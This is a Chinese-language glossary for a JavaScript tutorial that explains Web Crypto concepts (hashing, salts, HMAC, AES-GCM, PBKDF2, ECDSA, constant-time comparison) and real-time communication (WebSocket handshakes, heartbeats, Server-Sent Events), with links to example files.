哈希（散列）把任意长度的输入映射成固定长度的**摘要**（digest），且满足：同一输入必得同一输出、不同输入极难得到同一输出（抗碰撞）、从摘要无法反推输入（单向）。它**不加密、不保密**——任何人都能对同一份数据算出同样的摘要，所以哈希提供的是**完整性**而不是**机密性**。关键细节：密码学哈希（SHA-2 系列）与「非密码学哈希」（如 Java 的 `hashCode`、某些字符串散列）完全不同，后者可以被轻易构造碰撞，**绝不能**用于安全目的；摘要长度与抗碰撞强度也不是线性关系（SHA-256 的碰撞强度约为 2^128）。

也见 [Encoding, Encryption and Hashing（编码、加密与哈希）](#encoding-encryption-and-hashing编码加密与哈希)、[Avalanche Effect（雪崩效应）](#avalanche-effect雪崩效应)、[MAC（消息认证码）](#mac消息认证码)。

示例：[`35_web_crypto/02_digest_hashing.js`](35_web_crypto/02_digest_hashing.js)

### SHA-256（SHA-256 摘要算法）

SHA-256 是 SHA-2 家族中最常用的摘要算法，输出 256 位（32 字节）摘要，写法是 `crypto.subtle.digest('SHA-256', data)`。它是文件校验、内容寻址（如 Git 的对象名）、口令存储的盐值哈希、JWT 的 `HS256` 签名等场景的默认选择，与 SHA-384/512（更长摘要）并列。关键细节：`digest` 接收 `BufferSource`（`ArrayBuffer`、`Uint8Array` 等），返回的是 `ArrayBuffer`，要比较时**必须先转成十六进制或 Base64 再比**（直接比较两个 ArrayBuffer 对象永远不相等）；一次性摘要要求数据全在内存，大文件应分块计算。

也见 [Hash and Digest（哈希与摘要）](#hash-and-digest哈希与摘要)。

示例：[`35_web_crypto/02_digest_hashing.js`](35_web_crypto/02_digest_hashing.js)

### Avalanche Effect（雪崩效应）

雪崩效应是密码学哈希与分组密码的理想性质：**输入的微小变化（翻转一位）会让输出发生约一半比特的变化**，且无法从中反推「哪里变了」。它让「靠局部猜测逐位逼近输入」的攻击不可行——这正是「哈希值不能用来做模糊匹配」的原因：`'password'` 与 `'password1'` 的摘要毫无相似性。关键细节：雪崩效应也是**判断一个哈希实现是否靠谱**的快速试金石（改一位看输出是否大面积变化），但通过这个测试并不等于安全，仍应使用标准算法而不是自创的混合哈希。

也见 [Hash and Digest（哈希与摘要）](#hash-and-digest哈希与摘要)。

示例：[`35_web_crypto/02_digest_hashing.js`](35_web_crypto/02_digest_hashing.js)

### One-way Function（单向性与不可逆性）

不可逆性指「从摘要反推原文在计算上不可行」，这是哈希与加密的**根本区别**：加密是可逆的（有密钥就能还原），哈希是单向的（没有「反哈希」这回事，只能穷举）。因此「解密 MD5」是错误说法——那些「MD5 解密」网站其实是在比对预先算好的字典表。关键细节：不可逆不等于「不可破解」——弱口令（`123456`）的摘要可以直接查表得到，这就是**彩虹表**攻击，防御手段是**加盐**；同理，哈希值本身也不该被当作「加密后的敏感数据」写进日志或直接当主键用。

也见 [Rainbow Table（彩虹表）](#rainbow-table彩虹表)、[Salt（盐值）](#salt盐值)、[Hash and Digest（哈希与摘要）](#hash-and-digest哈希与摘要)。

示例：[`35_web_crypto/02_digest_hashing.js`](35_web_crypto/02_digest_hashing.js)

### Rainbow Table（彩虹表）

彩虹表是**预先算好的「哈希值 → 明文」查找表**（用时间换空间的链式压缩技巧），用来破解未加盐的弱口令：攻击者拿到一列 `MD5(password)` 就能直接反查出几十万个常见口令。它的存在说明「口令的裸哈希等于明文」——很多系统在库被拖走后才意识到这一点。关键细节：防御手段有两层且效果叠加——**加盐**（同一口令在不同用户处产生不同哈希，彩虹表失效）与**慢哈希**（用 PBKDF2 / bcrypt / Argon2 让每次计算都很贵，使穷举成本不可承受）；只加盐而不加迭代次数，仍挡不住针对特定盐的定向穷举。

也见 [Salt（盐值）](#salt盐值)、[PBKDF2（基于口令的密钥派生函数）](#pbkdf2基于口令的密钥派生函数)。

示例：[`35_web_crypto/05_key_derivation_pbkdf2.js`](35_web_crypto/05_key_derivation_pbkdf2.js)

### Salt（盐值）

盐是**每个用户或每次操作都不同的一段随机数据**，与输入一起参与哈希，使相同输入产生不同摘要：`hash(salt + password)`。它不需要保密（通常与摘要一起存库，或随密文一起传输），作用只是**破坏「预先算好的表」**，让彩虹表与批量比对失效。关键细节：盐必须**随机且足够长**（推荐 16 字节以上，用 `crypto.getRandomValues` 生成），绝不能是用户名、时间戳这类可预测值；在口令存储场景下**盐不能替代慢哈希**——盐挡住了查表，却挡不住针对单个用户的暴力穷举，两者必须同时上。

也见 [Rainbow Table（彩虹表）](#rainbow-table彩虹表)、[PBKDF2（基于口令的密钥派生函数）](#pbkdf2基于口令的密钥派生函数)。

示例：[`35_web_crypto/05_key_derivation_pbkdf2.js`](35_web_crypto/05_key_derivation_pbkdf2.js)

### HMAC（基于哈希的消息认证码）

HMAC（Hash-based Message Authentication Code）是「用哈希 + 密钥」计算出的**消息认证码**，写作 `HMAC(key, message)`，用于同时验证消息的**完整性**与**来源**（只有持同一密钥的人能算出同样的值）。典型用途是 Webhook 签名校验、API 请求签名、JWT 的 `HS256`。关键细节：HMAC **不是加密**，消息本身是明文可见的（要保密还得再加密）；它的安全性依赖**密钥保密**而非算法保密；验证时**必须用常量时间比较**，用 `===` 逐字节比较会泄露信息从而被逐位猜测。**常见误解**：把 `sha256(secret + message)` 当作 HMAC——这种「前缀拼接」构造存在长度扩展攻击，必须使用标准 HMAC。

也见 [MAC（消息认证码）](#mac消息认证码)、[Digital Signature and Verification（数字签名与签名验证）](#digital-signature-and-verification数字签名与签名验证)、[Timing-safe Comparison（常量时间比较）](#timing-safe-comparison常量时间比较)。

示例：[`35_web_crypto/03_hmac_signing.js`](35_web_crypto/03_hmac_signing.js)

### MAC（消息认证码）

MAC（Message Authentication Code）是「带密钥的完整性校验值」这一**类**技术的统称，HMAC 是基于哈希的实现，CMAC 是基于分组密码的实现。它解决的问题是：只用哈希的话任何人都能重算摘要并篡改内容；加上共享密钥后，**没有密钥就无法伪造出正确的校验值**。关键细节：MAC 使用**对称密钥**，因此**发送方与接收方必须共享同一个密钥**——这也决定了它无法提供「不可否认性」（接收方自己也能造出 MAC），需要不可否认性时必须改用非对称的**数字签名**。**常见误解**：把 MAC 当成签名——两者验证动作相似，但信任模型完全不同。

也见 [HMAC（基于哈希的消息认证码）](#hmac基于哈希的消息认证码)、[Digital Signature and Verification（数字签名与签名验证）](#digital-signature-and-verification数字签名与签名验证)。

示例：[`35_web_crypto/03_hmac_signing.js`](35_web_crypto/03_hmac_signing.js)

### Key（密钥）

密钥是加解密与签名中**唯一需要保密**的那份数据，安全界有一句话：「算法是公开的，安全性全在密钥上」（柯克霍夫原则）。在 Web Crypto 里密钥被抽象成 `CryptoKey` 对象，带有 `algorithm`、`usages`（能做什么，如 `['sign','verify']`）与 `extractable`（能否导出）三个关键元信息。关键细节：`usages` 是**强约束**——用只授权了 `encrypt` 的密钥去 `decrypt` 会直接抛错，这能防止密钥被挪作他用；`extractable: false` 的密钥无法被 `exportKey` 取出明文，适合放在不可信的前端环境。**常见误解**：以为「密钥越长越安全」——用错算法、或用 `Math.random()` 生成密钥，再长也不安全。

也见 [Key Format（密钥格式）](#key-format密钥格式)、[Symmetric Encryption（对称加密）](#symmetric-encryption对称加密)、[Asymmetric Encryption（非对称加密）](#asymmetric-encryption非对称加密)。

示例：[`35_web_crypto/01_crypto_overview.js`](35_web_crypto/01_crypto_overview.js)、[`35_web_crypto/06_ecdsa_keypair.js`](35_web_crypto/06_ecdsa_keypair.js)

### Symmetric Encryption（对称加密）

对称加密指**加密与解密用同一把密钥**（如 AES），优点是快（可加密大流量数据），缺点是「怎么把密钥安全地给对方」——密钥分发本身成了难题。工程上的常见解法是**混合加密**：用非对称加密（或密钥协商）传一把临时对称密钥，再用它加密实际数据（TLS 就是这么做的）。关键细节：对称加密只提供**机密性，不提供完整性**——密文被翻转一位，解密出来就是垃圾数据而不会报错，所以实际使用时要选认证加密模式（AES-GCM）或额外加 MAC。**常见误解**：以为「加密了就安全」——ECB 模式下相同明文块产生相同密文块，能直接看出图片轮廓，属于不该使用的模式。

也见 [AES（高级加密标准）](#aes高级加密标准)、[Asymmetric Encryption（非对称加密）](#asymmetric-encryption非对称加密)、[AEAD（带关联数据的认证加密）](#aead带关联数据的认证加密)。

示例：[`35_web_crypto/04_aes_gcm_encryption.js`](35_web_crypto/04_aes_gcm_encryption.js)

### Asymmetric Encryption（非对称加密）

非对称加密使用**一对数学上关联的密钥**：公钥可公开，私钥必须保密；用公钥加密的只有私钥能解，用私钥签名的只有公钥能验。它解决了对称加密的密钥分发问题，代价是**慢几个数量级**，所以几乎从不用于加密大量数据。关键细节：非对称密钥的用途是**分离的**——同一对密钥通常只用于「加密」或只用于「签名」其中之一，混用会带来安全风险；Web Crypto 里生成密钥对用 `generateKey`，且必须显式声明 `usages` 与 `namedCurve` 等参数。

也见 [Public and Private Key（公钥与私钥）](#public-and-private-key公钥与私钥)、[Digital Signature and Verification（数字签名与签名验证）](#digital-signature-and-verification数字签名与签名验证)。

示例：[`35_web_crypto/06_ecdsa_keypair.js`](35_web_crypto/06_ecdsa_keypair.js)

### Public and Private Key（公钥与私钥）

密钥对里的两半：**公钥**可自由分发（放服务器、写进前端、放进证书），**私钥**只应存在于生成它的那一方且永不外传（服务端私钥泄露等于身份被完全冒充）。它们的对应关系决定了核心性质：公钥能验证私钥的签名，但**无法**从公钥推算出私钥。关键细节：在浏览器里生成密钥对可以把私钥留在用户设备上（WebAuthn、端到端加密），而服务端签发 JWT 时**只把公钥给验证方**（JWKS 端点），私钥永远不下发。**常见误解**：以为「前端不能放密钥」就等于「前端不能有公钥」——公钥本来就是设计成公开的。

也见 [Asymmetric Encryption（非对称加密）](#asymmetric-encryption非对称加密)、[ECDSA（椭圆曲线数字签名算法）](#ecdsa椭圆曲线数字签名算法)。

示例：[`35_web_crypto/06_ecdsa_keypair.js`](35_web_crypto/06_ecdsa_keypair.js)

### AES（高级加密标准）

AES（Advanced Encryption Standard）是当今使用最广的对称分组密码，分组长度固定 128 位，密钥长度可选 128/192/256 位，在 Web Crypto 里写作 `{ name: 'AES-GCM', length: 256 }`。它是「行业默认答案」——选它不需要理由，不选它才需要。关键细节：AES 本身只定义了「怎么把一块 128 位数据搅乱」，多块数据怎么连起来由**工作模式**决定（GCM、CBC、CTR…），模式选错比密钥长度不足更致命；128 位密钥在可预见的未来已足够，256 位主要是应对将来的量子计算与合规要求。

也见 [AES-GCM（AES-GCM 认证加密）](#aes-gcmaes-gcm-认证加密)、[CBC Mode（CBC 密码块链接模式）](#cbc-modecbc-密码块链接模式)。

示例：[`35_web_crypto/04_aes_gcm_encryption.js`](35_web_crypto/04_aes_gcm_encryption.js)

### AES-GCM（AES-GCM 认证加密）

AES-GCM 是 AES 的 **Galois/Counter Mode**，属于认证加密（AEAD）：一次调用同时产出**密文与认证标签**，解密时如果密文或附加数据被改动过，`decrypt` 会**抛错**而不是返回垃圾数据。它因此成为 Web 上的推荐默认模式，`crypto.subtle.encrypt({ name: 'AES-GCM', iv, additionalData }, key, data)` 一行搞定加密加完整性校验。关键细节：GCM **绝对不能复用 IV**（同一密钥下重复 IV 会直接泄露密钥流乃至认证密钥），IV 推荐 12 字节并用 `crypto.getRandomValues` 生成；`additionalData` 用于认证「不加密但要防篡改」的元数据（如消息类型、用户 ID）。**常见误解**：以为 GCM 能防重放——它只保证内容没被改，攻击者原样重放整段密文仍然有效，防重放要自己加序号或时间戳。

也见 [Authentication Tag（认证标签）](#authentication-tag认证标签)、[AEAD（带关联数据的认证加密）](#aead带关联数据的认证加密)、[Initialization Vector（初始化向量）](#initialization-vector初始化向量)。

示例：[`35_web_crypto/04_aes_gcm_encryption.js`](35_web_crypto/04_aes_gcm_encryption.js)

### CBC Mode（CBC 密码块链接模式）

CBC（Cipher Block Chaining）是 AES 的一种传统工作模式：每个明文块先与前一个密文块**异或**再加密，因此需要 IV，且相同明文块会产生不同密文块。它本身**不提供完整性**——攻击者可以通过翻转密文比特来可控地翻转解密结果的对应比特（比特翻转攻击），因此使用 CBC 时必须额外加 MAC，且**验证顺序必须是「先验 MAC 再解密」**。关键细节：CBC 无法并行加密、需要填充（PKCS#7），而填充机制又引出 padding oracle 攻击；因此新项目应直接选 AES-GCM，只有需要与遗留系统互通时才用 CBC。

也见 [AES-GCM（AES-GCM 认证加密）](#aes-gcmaes-gcm-认证加密)。

示例：[`35_web_crypto/04_aes_gcm_encryption.js`](35_web_crypto/04_aes_gcm_encryption.js)

### Initialization Vector（初始化向量）

初始化向量（IV，在计数器类模式里也叫 nonce）是每次加密都要**重新生成**的一段随机数据，与密钥一起参与运算，保证「同一密钥加密同一明文两次」得到不同密文。关键细节：IV **不需要保密**（通常与密文一起传输），但**绝对不能在同一密钥下重复使用**；推荐长度 12 字节（GCM 的标准长度）、用 `crypto.getRandomValues` 生成。**IV 复用攻击**是最致命的一类密码学误用：GCM 里同一 (key, IV) 出现两次，攻击者可异或两段密文抵消密钥流、直接恢复明文，并可伪造认证标签——这正是「不要用固定 IV、不要手工拼计数器 IV」的原因。

也见 [AES-GCM（AES-GCM 认证加密）](#aes-gcmaes-gcm-认证加密)、[Salt（盐值）](#salt盐值)。

示例：[`35_web_crypto/04_aes_gcm_encryption.js`](35_web_crypto/04_aes_gcm_encryption.js)

### Authentication Tag（认证标签）

认证标签是认证加密模式在加密时额外产出的**短校验值**（GCM 默认 16 字节），它由密钥与密文共同决定，只有持密钥的人才能验证。解密时 `crypto.subtle.decrypt` 会自动核对标签，不匹配就抛错——这就是「篡改可被检测」的实现方式。关键细节：标签**不是签名**（不提供不可否认性，因为双方都知道密钥）；标签长度可以截短以省空间，但截得越短伪造成功率越高（一般不要低于 12 字节）；标签必须与密文**一起传输**，丢了标签就无法解密。

也见 [AEAD（带关联数据的认证加密）](#aead带关联数据的认证加密)、[MAC（消息认证码）](#mac消息认证码)。

示例：[`35_web_crypto/04_aes_gcm_encryption.js`](35_web_crypto/04_aes_gcm_encryption.js)

### AEAD（带关联数据的认证加密）

AEAD（Authenticated Encryption with Associated Data）是一类**同时保证机密性与完整性**的加密模式统称，AES-GCM 与 ChaCha20-Poly1305 是代表。它把输入分成两部分：需要**既保密又完整**的明文，和只需要**完整**（不加密但要防篡改）的关联数据（AAD），后者用于绑定协议头、用户 ID、序号这类元数据——改动任何一个字节都会导致解密失败。关键细节：AEAD 让你不再需要「加密后自己拼 HMAC」这种容易出错的手工组合（顺序搞反、只验部分数据都是常见漏洞），所以**新代码一律用 AEAD**；但 AEAD 不防重放、也不解决密钥分发，这两件事仍需上层协议处理。

也见 [AES-GCM（AES-GCM 认证加密）](#aes-gcmaes-gcm-认证加密)、[Authentication Tag（认证标签）](#authentication-tag认证标签)。

示例：[`35_web_crypto/04_aes_gcm_encryption.js`](35_web_crypto/04_aes_gcm_encryption.js)

### Key Derivation Function（密钥派生函数）

密钥派生函数（KDF）从「较弱的输入材料」（口令、共享秘密）**确定性地派生出可以当密钥用的比特串**，并刻意让每次计算都变慢，以此抵抗暴力穷举。常见 KDF 有 PBKDF2（基于迭代哈希）、bcrypt/scrypt（额外消耗内存）、HKDF（从已有的高熵秘密派生多个密钥）、Argon2（抗 GPU）。关键细节：**口令绝不能直接当密钥用**——用户口令熵极低（往往不到 40 位），而 AES 密钥是 128/256 位的均匀随机串，直接拿来当密钥等于把密钥空间缩小到字典大小。KDF 输出的才是「看起来随机的固定长度密钥」。

也见 [PBKDF2（基于口令的密钥派生函数）](#pbkdf2基于口令的密钥派生函数)、[Iteration Count（迭代次数）](#iteration-count迭代次数)。

示例：[`35_web_crypto/05_key_derivation_pbkdf2.js`](35_web_crypto/05_key_derivation_pbkdf2.js)

### PBKDF2（基于口令的密钥派生函数）

PBKDF2（Password-Based Key Derivation Function 2）是最普及的口令派生算法：把「口令 + 盐」反复做 HMAC 若干轮，得到固定长度的密钥比特，在 Web Crypto 里由 `deriveBits` / `deriveKey` 暴露，参数是 `{ name: 'PBKDF2', salt, iterations, hash: 'SHA-256' }`。关键细节：**盐与迭代次数必须一起存储**（否则无法重现派生结果）；相同的（口令、盐、迭代次数、哈希算法）必然得到相同的密钥，这正是可以校验口令的原因；PBKDF2 只消耗 CPU 不消耗内存，因此对 GPU/ASIC 攻击的抵抗力弱于 Argon2，但在 Web Crypto 可用的算法里它是标准选择。

也见 [Salt（盐值）](#salt盐值)、[Iteration Count（迭代次数）](#iteration-count迭代次数)、[Key Derivation Function（密钥派生函数）](#key-derivation-function密钥派生函数)。

示例：[`35_web_crypto/05_key_derivation_pbkdf2.js`](35_web_crypto/05_key_derivation_pbkdf2.js)

### Iteration Count（迭代次数）

迭代次数是 PBKDF2 里「把哈希运算重复多少轮」的参数，它直接决定破解成本：迭代 10 万次意味着攻击者每试一个口令都要付出 10 万次哈希的代价。选值的依据是**性能预算**而不是固定数字——常见做法是调参到「服务端校验一次约 100ms」，或参考 OWASP 的当前推荐值；硬件每年都在变快，所以这个值需要随年份上调。关键细节：迭代次数**不是密钥的一部分，但必须与盐一起存储并参与重算**，改了它旧口令就验不过；对用户体验的影响在于校验延迟，所以登录接口要做限流，而不是靠把迭代次数堆到几秒来防爆破。

也见 [PBKDF2（基于口令的密钥派生函数）](#pbkdf2基于口令的密钥派生函数)。

示例：[`35_web_crypto/05_key_derivation_pbkdf2.js`](35_web_crypto/05_key_derivation_pbkdf2.js)

### ECDSA（椭圆曲线数字签名算法）

ECDSA（Elliptic Curve Digital Signature Algorithm）是基于椭圆曲线的数字签名算法，Web Crypto 里用 `{ name: 'ECDSA', namedCurve: 'P-256' }` 声明，密钥短（256 位即可提供约 128 位安全强度）而签名快，是 TLS 证书、JWT 的 `ES256`、代码签名的常见选择。关键细节：`generateKey` 时**必须传入 `['sign','verify']` 作为 usages**（ECDSA 密钥不能用于加密）；签名结果在 Web Crypto 里是 IEEE P1363 格式的定长 `r||s`，与其他库常见的 DER 编码不同，跨系统互验时需要转换——这是「本地验得过、对方的 JWT 库验不过」的典型原因；签名是**随机化**的，同一消息两次签名结果不同，属于正常现象。

也见 [Digital Signature and Verification（数字签名与签名验证）](#digital-signature-and-verification数字签名与签名验证)、[Public and Private Key（公钥与私钥）](#public-and-private-key公钥与私钥)。

示例：[`35_web_crypto/06_ecdsa_keypair.js`](35_web_crypto/06_ecdsa_keypair.js)

### Digital Signature and Verification（数字签名与签名验证）

数字签名是**用私钥对消息签名、任何人用公钥验证**的机制，提供完整性、真实性与不可否认性（签名者事后无法抵赖，因为只有他持有私钥）。它比 MAC 更强的地方正在于**不需要共享密钥**：验证者只拿到公钥，因此无法伪造签名。关键细节：签名**不加密消息**（消息仍是明文，要保密需另行加密，常见做法是先签名后加密或反过来）；验证方必须用**完全相同的字节**去验（多一个空格、序列化字段顺序不同都会失败），所以跨语言互验时要约定规范化方式（如 JWT 的 base64url 规则）；工程上要**先验签再解析内容**，绝不能反过来。

也见 [HMAC（基于哈希的消息认证码）](#hmac基于哈希的消息认证码)、[ECDSA（椭圆曲线数字签名算法）](#ecdsa椭圆曲线数字签名算法)。

示例：[`35_web_crypto/06_ecdsa_keypair.js`](35_web_crypto/06_ecdsa_keypair.js)

### Key Format（密钥格式）

同一把密钥可以有不同的**表示格式**，Web Crypto 的 `importKey`/`exportKey` 用 `format` 参数区分，跨系统交互时格式写错是最高频的踩坑点：`raw`（裸密钥字节，仅对称密钥与公钥可用）、`pkcs8`（私钥的标准容器）、`spki`（公钥的标准容器，即 SubjectPublicKeyInfo）、`jwk`（JSON 形式，字段化，便于嵌入 JSON 文档，但**包含私钥字段时就是明文私钥**，不要外传）、`PEM`（Base64 + 头尾标记的文本形式，通常需要在 PKCS#8/SPKI 与 PEM 之间自行转换）。关键细节：`raw` 导出的 ECDSA 公钥同样遵循 P1363 定长格式，与 DER 编码不同；导出公钥用于发布、导出私钥用于备份，两者用途不同，代码里要写清楚以免误传。

也见 [Key（密钥）](#key密钥)、[ECDSA（椭圆曲线数字签名算法）](#ecdsa椭圆曲线数字签名算法)。

示例：[`35_web_crypto/06_ecdsa_keypair.js`](35_web_crypto/06_ecdsa_keypair.js)

### Timing-safe Comparison（常量时间比较）

常量时间比较指**比较耗时与「匹配了多少字节」无关**的比较方式：普通字符串比较（`===`、`Buffer.equals`）会在第一个不同的字节处提前返回，攻击者通过反复请求并测量耗时，就能**逐字节猜出** HMAC 或令牌的正确值（时序攻击）。正确做法是用 `crypto.timingSafeEqual`（Node）或自行对全部字节做累积异或后统一判断。关键细节：**长度不等时也要小心处理**——`timingSafeEqual` 在长度不等时直接抛错，会泄露长度信息，通常做法是先比较长度再比较内容，或把长度也纳入累积计算；这类漏洞不产生任何错误日志，只能靠代码审计发现。

也见 [HMAC（基于哈希的消息认证码）](#hmac基于哈希的消息认证码)。

示例：[`35_web_crypto/03_hmac_signing.js`](35_web_crypto/03_hmac_signing.js)

### Encoding, Encryption and Hashing（编码、加密与哈希）

三者最容易被混为一谈，但目的完全不同：**编码**（Base64、URL 编码、UTF-8）是「换一种表示形式」，**无密钥、可逆、不提供任何安全性**，只是为了让数据能安全地放进文本协议；**加密**是「用密钥隐藏内容」，**可逆，保密性是目的**；**哈希**是「生成固定长度指纹」，**不可逆，完整性是目的**。判断一个操作属于哪一类，只需问两个问题：需要密钥吗？能还原吗？Base64 两个答案分别是「否」和「是」，所以它**绝对不是加密**——把 Base64 当成加密来保护敏感数据是典型的安全事故。

也见 [Hash and Digest（哈希与摘要）](#hash-and-digest哈希与摘要)、[One-way Function（单向性与不可逆性）](#one-way-function单向性与不可逆性)、[Symmetric Encryption（对称加密）](#symmetric-encryption对称加密)。

示例：[`35_web_crypto/01_crypto_overview.js`](35_web_crypto/01_crypto_overview.js)、[`35_web_crypto/02_digest_hashing.js`](35_web_crypto/02_digest_hashing.js)

## 实时通信与流（WebSocket / SSE / Streams）

### WebSocket（WebSocket 协议）

WebSocket 是浏览器与服务器之间的**持久双向通信协议**（`ws:`/`wss:`），一次连接建立后双方可以随时互发消息，不再受 HTTP「请求—响应」模型的限制。它的 API 很简洁：`const ws = new WebSocket(url)`，之后监听 `open`、`message`、`error`、`close` 四个事件，用 `send()` 发送。关键细节：它**没有内置的自动重连**（连接断了要自己重建，且要配合退避策略），也**没有内置的分组/房间概念**（广播、房间都是应用层协议自己定义的）；消息是**按消息边界投递**的（不像 TCP 是字节流），但 `send()` 不会等待对端收到，所以业务层仍需自己做 ACK 与幂等。

也见 [Handshake（握手）](#handshake握手)、[Server-Sent Events（服务器发送事件，SSE）](#server-sent-events服务器发送事件sse)、[Heartbeat（心跳保活）](#heartbeat心跳保活)。

示例：[`36_realtime_and_streams/01_websocket_basics.js`](36_realtime_and_streams/01_websocket_basics.js)、[`36_realtime_and_streams/02_websocket_broadcast.js`](36_realtime_and_streams/02_websocket_broadcast.js)

### Handshake（握手）

WebSocket 的握手复用了 **HTTP 的第一次请求**：客户端发一个带 `Upgrade: websocket`、`Connection: Upgrade`、`Sec-WebSocket-Key`（随机 Base64）的 GET 请求，服务端回 `101 Switching Protocols` 并附上由 Key 与固定 GUID 拼出 SHA-1 摘要的 `Sec-WebSocket-Accept`，之后这条 TCP 连接就脱离 HTTP 语义，开始传 WebSocket 帧。关键细节：正因为握手是 HTTP，所以**能复用 HTTP 的认证与路由**（Cookie、`Authorization`、路径参数、反向代理规则都能用），这也是它比裸 TCP 更容易部署的原因；但**握手只能携带头部，不能在握手后改认证身份**，需要「连接期内的身份切换」要自己在协议里做。

也见 [HTTP Upgrade（HTTP 协议升级）](#http-upgradehttp-协议升级)。

示例：[`36_realtime_and_streams/01_websocket_basics.js`](36_realtime_and_streams/01_websocket_basics.js)

### HTTP Upgrade（HTTP 协议升级）

HTTP Upgrade 是 HTTP/1.1 定义的机制：客户端在请求头里声明「我想换用别的协议」，服务端若同意就回 `101 Switching Protocols`，此后同一条 TCP 连接上的字节由新协议解释。WebSocket 是它最著名的使用者，但同一机制也被用于 HTTP/2 的 `h2c` 等场景。关键细节：升级**只能发生在一次完整的 HTTP 请求之后**，且中间的反向代理、负载均衡**必须显式支持并转发 Upgrade 头**——很多「本地能连上、上线就 404/400」的 WebSocket 问题都是 nginx 缺少 `proxy_set_header Upgrade $http_upgrade` 与 `proxy_http_version 1.1` 造成的。

也见 [Handshake（握手）](#handshake握手)。

示例：[`36_realtime_and_streams/01_websocket_basics.js`](36_realtime_and_streams/01_websocket_basics.js)

### Full-duplex（全双工）

全双工指**同一条连接上双方可以同时发送和接收**，是 WebSocket 相对 HTTP 轮询最本质的优势。半双工（如对讲机式的一问一答）在实时协作、IM、多人游戏、行情推送里会造成无法接受的延迟与请求开销。关键细节：全双工是**协议层能力**，不等于应用层不需要流控——服务端给一个慢客户端狂推消息仍会撑爆发送缓冲，所以生产级 WebSocket 服务要做**每连接发送队列上限 + 丢弃最旧消息或断开**的策略；这与 Streams 里的背压是同一个问题在不同层次的表现。

也见 [WebSocket（WebSocket 协议）](#websocketwebsocket-协议)、[highWaterMark and Backpressure（highWaterMark 与背压）](#highwatermark-and-backpressurehighwatermark-与背压)。

示例：[`36_realtime_and_streams/01_websocket_basics.js`](36_realtime_and_streams/01_websocket_basics.js)

### Heartbeat（心跳保活）

心跳是双方**定期互发一个空消息**来确认连接仍然活着、并阻止中间设备（NAT、负载均衡、云厂商空闲连接回收）把长时间没数据的连接悄悄切断。它在应用层的典型做法是服务端每 30 秒发一次 `{ type: 'ping' }`、客户端回 `{ type: 'pong' }`，若连续 N 次没收到回应就主动关闭并按重连策略重连。关键细节：**TCP 层面的 keepalive 通常不够**（默认两小时才探测一次，且中间代理可能不转发），所以应用层心跳几乎必需；心跳间隔要小于最严格的空闲超时（常见 60 秒），否则连接会在你睡着的间隙被掐断，而客户端直到下一次 `send()` 才发现。

也见 [Ping and Pong（ping/pong 帧）](#ping-and-pongpingpong-帧)、[Auto-reconnect（断线重连）](#auto-reconnect断线重连)。

示例：[`36_realtime_and_streams/02_websocket_broadcast.js`](36_realtime_and_streams/02_websocket_broadcast.js)

### Ping and Pong（ping/pong 帧）

WebSocket 协议本身定义了两种**控制帧**：`ping` 与 `pong`，它们由协议栈自动处理（收到 ping 必须回 pong），不占用应用层的消息编号，也不暴露给 `onmessage`。浏览器端的 `WebSocket` API **不允许 JS 主动发送 ping 帧**，因此浏览器场景只能靠应用层的心跳消息模拟；Node 侧则可以通过 `ws` 库的 `ws.ping()` 使用真正的协议帧。关键细节：协议级 ping 的好处是**不打扰业务消息队列**、也不会被应用层解析逻辑影响；若同时用了协议 ping 与应用层心跳，要注意别让两套超时策略互相打架。

也见 [Heartbeat（心跳保活）](#heartbeat心跳保活)。

示例：[`36_realtime_and_streams/02_websocket_broadcast.js`](36_realtime_and_streams/02_websocket_broadcast.js)

### Server-Sent Events（服务器发送事件，SSE）

SSE 是「服务器单向、持续向浏览器推送文本事件」的 Web 标准：本质上就是**一条永不结束的 HTTP 响应**，Content-Type 为 `text/event-stream`，服务端不断写入 `data:` 行，浏览器通过 `EventSource` 或 `fetch` 读取。它适合行情、通知、日志流、AI 逐字回复这类「只需服务端推、客户端很少发」的场景，实现比 WebSocket 简单得多（无需 Upgrade、走普通 HTTP、天然兼容 CDN 与代理）。关键细节：SSE 是**单向**的（客户端要发消息得另发请求）、基于**文本**（二进制要 Base64）、在 HTTP/1.1 下每个域名**约 6 条连接上限**（HTTP/2 下多路复用则不受此限）。

也见 [EventSource（EventSource 接口）](#eventsourceeventsource-接口)、[WebSocket（WebSocket 协议）](#websocketwebsocket-协议)、[Event Stream Format（事件流格式）](#event-stream-format事件流格式)。

示例：[`36_realtime_and_streams/03_server_sent_events.js`](36_realtime_and_streams/03_server_sent_events.js)

### EventSource（EventSource 接口）

`EventSource` 是浏览器读取 SSE 的标准接口：`new EventSource('/events')` 之后监听 `message`、`open`、`error` 以及自定义事件名（服务端用 `event: foo` 指定），并且**自动处理重连与事件 ID**。关键细节：它**不能自定义请求头**（无法加 `Authorization`），所以带鉴权的 SSE 要么把令牌放查询串（有泄露进日志的风险）、要么改用 `fetch` + `ReadableStream` 自己解析事件流；它**不做跨域限制之外的额外防护**（需要服务端设置 CORS）；服务端返回的响应若被中间层缓冲（如某些网关默认开启响应缓冲），事件会被攒着一起发，必须显式关闭缓冲。

也见 [Server-Sent Events（服务器发送事件，SSE）](#server-sent-events服务器发送事件sse)、[Auto-reconnect（断线重连）](#auto-reconnect断线重连)。

示例：[`36_realtime_and_streams/03_server_sent_events.js`](36_realtime_and_streams/03_server_sent_events.js)

### Event Stream Format（事件流格式）

SSE 的线上格式是**纯文本、按行、以空行分隔事件**：`data:` 是负载（可多行拼接）、`event:` 是事件名、`id:` 是事件 ID、`retry:` 是重连间隔毫秒数，以 `:` 开头的行是注释（常用来做心跳）。关键细节：`data:` 行**只支持 UTF-8 文本**，换行必须用多个 `data:` 行表达，不能塞裸 `\n`；**空行才是事件的分隔符**，服务端少写一个空行就会导致事件被挂起不投递（这是「本地 curl 看得到、浏览器收不到」的典型原因）；用 `fetch` 手写 SSE 客户端时，需要自己实现这个解析状态机。

也见 [Server-Sent Events（服务器发送事件，SSE）](#server-sent-events服务器发送事件sse)。

示例：[`36_realtime_and_streams/03_server_sent_events.js`](36_realtime_and_streams/03_server_sent_events.js)

### Auto-reconnect（断线重连）

SSE 的重连是**协议内置**的：连接断开后浏览器会自动重连，重连间隔由服务端 `retry:` 或默认值决定。WebSocket **没有**这个能力，必须自己实现，且要遵循两条经验：**指数退避 + 抖动**（`1s, 2s, 4s…` 加随机量，避免服务端重启后所有客户端同时重连造成惊群）、**区分断开原因**（网络抖动可重连，认证失败/协议错误不该无脑重连，否则会打出无限循环的失败请求）。关键细节：重连后必须考虑**消息补发**——断线期间错过的消息用 `Last-Event-ID` 或业务侧游标补齐，否则前端会出现状态空洞。

